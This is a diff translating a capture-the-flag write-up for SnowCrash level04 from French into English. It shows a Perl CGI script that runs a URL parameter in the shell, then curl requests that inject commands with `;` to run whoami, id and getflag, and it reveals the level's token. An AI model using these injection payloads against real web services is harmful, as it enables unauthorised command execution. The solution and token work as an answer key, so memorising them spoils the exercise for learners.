@@ -1,14 +1,14 @@
 # level04
 
-1. Fichiers trouvés dans `~/` :
+1. Files found in `~/` :
 
 ```bash
 ./level04.pl
 ```
 
-2) Analyse du fichier
+2. Script analysis
 
-Le script est un petit CGI/Perl vulnérable qui exécute le contenu du paramètre `x` via des backticks shell :
+The script is a small vulnerable CGI/Perl that executes the content of parameter `x` via shell backticks :
 
 ```perl
 use CGI qw{param};
@@ -18,14 +18,18 @@ sub x {
 }
 x(param("x"));
 ```
-La valeur fournie par un visiteur est passée au shell et exécutée.
 
-- confirmer qu'un service écoute sur le port 4747
+The value provided by a visitor is passed to the shell and executed.
+
+- Confirm that a service is listening on port 4747 :
+
 ```bash
 level04@SnowCrash:~$ ss -tlnp | grep 4747
 LISTEN 0 128 :::4747 :::*     
 ```
-- vérifier sous quel user la commande s'exécutera (test rapide)
+
+- Check under which user the command will execute (quick test) :
+
 ```bash
 level04@SnowCrash:~$ curl -s 'http://127.0.0.1:4747/?x=%3B+whoami'
 flag04
@@ -33,16 +37,16 @@ level04@SnowCrash:~$ curl -s 'http://127.0.0.1:4747/?x=%3B+id'
 uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)
 ```
 
-Les réponses confirment que le script est actif et exécutera toute commande passée via le paramètre `x`.
+The responses confirm that the script is active and will execute any command passed via the `x` parameter.
 
-4) Exploitation pour récupérer le token :
+3. Exploitation
 
-Le payload consiste à séparer la commande `echo` initiale de la commande malveillante par un `;` et à appeler `getflag` :
+The payload consists of separating the initial `echo` command from the malicious command with a `;` and calling `getflag` :
 
 ```bash
 curl 'http://127.0.0.1:4747/?x=%3B+getflag'
 ```
 
-4) Token découvert :
+4. Token discovered
 
-le token est `ne2searoevaevoem4ov4ar8ap`
+The token is : `ne2searoevaevoem4ov4ar8ap`
